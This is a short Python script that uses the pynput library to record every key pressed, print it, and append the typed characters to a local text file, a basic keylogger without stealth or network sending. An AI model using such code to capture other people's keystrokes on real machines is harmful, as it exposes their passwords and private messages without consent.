from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("kefile.txt",'a') as logkey:
        try: 
            char = key.char
            logkey.write(char)
        except: 
            print("Cannot get char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()